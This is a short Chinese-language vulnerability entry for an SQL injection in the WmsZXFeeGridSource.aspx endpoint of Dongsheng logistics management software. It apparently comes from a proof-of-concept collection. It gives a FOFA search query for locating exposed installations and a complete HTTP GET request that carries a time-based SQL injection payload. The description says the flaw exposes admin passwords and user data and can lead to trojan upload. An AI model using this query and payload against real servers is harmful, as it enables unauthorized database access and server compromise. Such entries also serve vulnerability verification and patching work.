## 东胜物流管理软件-WmsZXFeeGridSource.asp-sql注入漏洞

## 一、漏洞简介
东胜物流管理软件 WmsZXFeeGridSource.aspx接口处存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## fofa
```
app="东胜物流软件-物流软件"
```

## POC
```
GET /WMS_ZX/WmsZXFeeGridSource.aspx?read=areaname&areaname=-1%27;WAITFOR+DELAY+%270:0:8%27-- HTTP/1.1
Host: [您的主机名或IP地址]
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
```
